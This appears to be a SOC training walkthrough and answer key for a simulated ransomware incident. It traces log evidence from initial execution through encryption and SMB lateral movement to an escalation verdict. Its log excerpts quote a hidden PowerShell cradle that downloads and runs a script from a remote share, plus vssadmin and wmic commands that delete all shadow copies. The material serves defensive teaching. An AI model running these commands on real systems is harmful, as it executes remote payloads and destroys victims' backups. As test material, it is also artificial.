# Ransomware-01 Walkthrough: Ransomware Deployment Detected

## Overview

This is a **true positive** ransomware incident. The attacker used a PowerShell cradle
to download and execute a ransomware payload, deleted volume shadow copies to prevent
recovery, and spread laterally to a file server via SMB.

---

## Step 1 — Identify Initial Execution

Look at the **Sysmon logs** at `03:12:01`. You'll see:

```
cmd.exe spawned powershell -ep bypass -w hidden -c IEX(...)DownloadString('\\10.0.1.99\share\update.ps1')
```

This is a **PowerShell download cradle** — a classic living-off-the-land technique.

- `MITRE T1059.001` — PowerShell execution
- Bypass execution policy (`-ep bypass`) to avoid restrictions
- Hidden window (`-w hidden`) to evade user detection

---

## Step 2 — Shadow Copy Deletion

At `03:12:15` and `03:12:17`:

```
vssadmin.exe Delete Shadows /all /quiet
wmic.exe shadowcopy delete
```

Both commands attempt to delete all VSS snapshots. This is **textbook ransomware behaviour**
to prevent the victim from restoring files from backups.

- `MITRE T1490` — Inhibit System Recovery

---

## Step 3 — Encryption Evidence

Starting at `03:12:20`, files are renamed with a `.LOCKED` extension at high speed:

- `Q1_Report.docx` → `Q1_Report.docx.LOCKED`
- `salary_data.xlsx` → `salary_data.xlsx.LOCKED`

And a ransom note is dropped: `HOW_TO_RESTORE.txt`.

- `MITRE T1486` — Data Encrypted for Impact

---

## Step 4 — Lateral Movement

At `03:13:44`, the payload opens an SMB connection to `FILE-SERVER-01 (10.0.1.10)` on port
445. By `03:14:01`, the same vssadmin deletion is running on FILE-SERVER-01, and 347 files
are encrypted within 26 seconds.

- `MITRE T1021.002` — SMB/Windows Admin Shares

---

## Step 5 — Verdict

| Decision | Answer |
|---|---|
| Verdict | **True Positive** |
| Severity | **Critical** |
| Escalate? | **Yes — escalate to L2/IR immediately** |

### Key findings to document:
- PowerShell download cradle from internal share `\\10.0.1.99\share\update.ps1`
- Shadow copy deletion on two hosts
- 347+ files encrypted on the file server
- Registry persistence established on FILE-SERVER-01
- Lateral movement via SMB to file server

This is an active ransomware incident. Escalate for immediate network isolation and IR engagement.
